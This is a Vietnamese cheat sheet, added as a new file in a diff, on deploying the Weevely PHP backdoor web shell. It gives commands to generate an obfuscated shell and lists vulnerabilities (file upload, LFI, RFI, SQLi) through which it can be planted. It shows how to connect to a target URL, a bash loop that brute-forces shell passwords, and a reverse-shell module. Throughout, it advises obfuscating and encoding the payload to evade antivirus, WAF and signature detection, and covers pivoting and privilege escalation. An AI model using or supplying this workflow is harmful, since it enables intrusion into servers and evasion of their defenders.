@@ -1,0 +1,141 @@
+1. Weevely là gì?
+
+    Weevely là web shell PHP backdoor nhỏ gọn, mã nguồn mở, ngụy trang cao, hỗ trợ control qua CLI.
+
+    Hỗ trợ gửi lệnh, upload/download file, pivot, chuyển tiếp port, tải module mở rộng, shell tương tác, enumerate, brute-force, escalation, automation...
+
+    Bypass nhiều WAF, filter do mã PHP đơn giản, ngắn gọn (dễ lách blacklist, filter).
+
+2. Cài đặt Weevely
+A. Kali/Ubuntu/Debian (có sẵn trong Kali)
+
+sudo apt update
+sudo apt install weevely
+
+B. Cài bản mới nhất
+
+git clone https://github.com/epinna/weevely3.git
+cd weevely3
+python3 setup.py install
+
+C. Kiểm tra
+
+weevely --version
+
+3. Tạo web shell với Weevely
+A. Tạo shell PHP
+
+weevely generate <mật_khẩu> shell.php
+# Ví dụ:
+weevely generate abc123 shell.php
+
+    Kết quả là file shell.php rất nhỏ, thường dưới 1KB, mã PHP đã encode/ngụy trang.
+
+B. Upload shell lên server
+
+    Qua vuln upload, file manager, LFI, RFI, SQLi, hoặc bất kỳ kênh nào upload file lên server.
+
+4. Kết nối tới shell (qua HTTP/HTTPS)
+
+weevely <url_shell> <mật_khẩu>
+# Ví dụ:
+weevely http://target.com/uploads/shell.php abc123
+
+    Vào CLI tương tác như một phiên shell thật!
+
+5. Các lệnh mạnh trong Weevely
+Lệnh	Ý nghĩa
+help	Hiện toàn bộ lệnh/module hỗ trợ
+ls, cd, cat, rm, mv, cp	Quản lý file/folder giống Linux
+upload <local> <remote>	Upload file từ máy bạn lên server
+download <remote> <local>	Tải file từ server về máy bạn
+shell <lệnh>	Chạy lệnh hệ thống trực tiếp
+backdoor	Tạo reverse shell tới máy attacker (dùng nc, socat, bash, python...)
+userenum, phppath, netstat, find, ps, passwd, phpinfo, checksec	Module enumerate hệ thống, user, dịch vụ
+db_admin, db_mysql	Module brute-force, dump DB MySQL (nếu có config)
+spawn	Tạo pseudo-shell ổn định
+audit, pivot, proxy	Chuyển tiếp port, tạo pivot shell (giống chisel, proxychains)
+6. Module mạnh và workflow nâng cao của Weevely
+A. Bypass detection
+
+    Shell chỉ là 1 dòng PHP, cực ngắn, encode, dễ đổi biến/obfuscate để bypass blacklist, AV, WAF.
+
+    Đổi tên file, biến $c, $s, đổi base64 để lách rule signature.
+
+B. File transfer & chuyển tiếp port
+
+    Tải lên file “nc”, “socat”, “linpeas”, “pspy”, “chisel”, hoặc exploit LPE khác.
+
+    Chuyển tiếp port nội bộ (pivot):
+
+        Ví dụ: chuyển port 3306 MySQL từ target ra ngoài để truy cập DB qua máy attacker.
+
+C. Module escalation, privilege check
+
+    Check SUID, SUDO, LPE, script enumerate, tìm bug privilege escalation, upload script LinEnum, LinPEAS, run trực tiếp.
+
+    Có thể bật checksec, enumerate PHP info, debug log, đọc config web.
+
+D. Tự động hóa CTF/post-exploit
+
+    Script tự động brute-force nhiều shell.php, nhiều mật khẩu, log lại shell active.
+
+    Kết hợp với gobuster/ffuf để scan shell, brute param.
+
+    Dùng trong các chain: LFI/RFI → upload → connect → escalate.
+
+E. Phục hồi shell ổn định (spawn pty)
+
+spawn python -c 'import pty;pty.spawn("/bin/bash")'
+
+    Khi lên được shell, chuyển thành TTY real, thuận tiện dùng su/sudo, tab completion.
+
+F. Tạo backdoor, reverse shell ngay từ shell PHP
+
+    Module backdoor, netcat/socat, tự động connect về attacker (vượt firewall).
+
+7. Automation, scripting với Weevely
+
+    Brute-force nhiều mật khẩu:
+
+    for pass in $(cat passlist.txt); do weevely http://target/shell.php $pass; done
+
+    Scan hàng loạt shell trên subdomain, path khác nhau.
+
+    Kết hợp với Burp, curl, ffuf, gobuster để enumerate khả năng upload/execute shell.
+
+    Chain với Metasploit, Empire để post-exploit, pivot, escalate...
+
+8. Fix lỗi thường gặp
+Lỗi	Cách xử lý
+Shell không connect được	Sai mật khẩu, shell bị xóa, filter WAF, path URL sai
+Shell bị AV/WAF block	Đổi mã PHP, đổi biến, encode, rename file, thử base64, che giấu payload
+Không upload được file	Thử dùng module upload khác, đổi file name, dùng curl/wget trực tiếp
+Lệnh shell không chạy	Không đủ quyền, shell chạy dưới quyền www-data, thử escalate/lpe
+Proxy/pivot không ra ngoài được	Mở port trên firewall, thử pivot qua port hợp pháp (80,443)
+Shell chậm/lỗi timeout	Server yếu, filter rate, thử optimize, chuyển sang reverse shell
+9. So sánh Weevely với các web shell khác
+Tool	Ưu điểm Weevely	Khác biệt
+Weevely	Nhỏ, ngụy trang, automation, module mạnh, tương tác CLI như shell thật, pivot	Không UI, chỉ PHP
+PentestMonkey PHP	Đơn giản, dùng trực tiếp qua URL	Không automation, không pivot, không module extra
+China Chopper	GUI mạnh, nhiều tính năng, evade, custom encoding	Chủ yếu cho ASP, JSP, phổ biến tại TQ, dễ bị signature detect
+b374k, r57	UI đẹp, nhiều module	Dễ bị phát hiện, code lớn, không automation
+Webshell custom	Dễ chỉnh sửa, bypass tốt	Thiếu CLI/automation
+10. Tài liệu, link hữu ích
+
+    Weevely3 Github
+
+    Hacktricks Web Shells
+
+    PayloadAllTheThings – Web Shells
+
+    PHP Web Shell Collection
+
+Tóm tắt nhanh
+
+    Weevely: PHP web shell backdoor CLI mạnh nhất, automation, upload/download file, pivot, bypass WAF, module mạnh, spawn shell ổn định, chuyển tiếp port, escalate quyền.
+
+    Tích hợp nhiều module post-exploit, tự động hóa, brute-force, report, ngụy trang cực tốt.
+
+    Phối hợp cùng Metasploit, Empire, chisel, linpeas, Burp để hoàn thiện workflow pentest web/app, CTF.
+
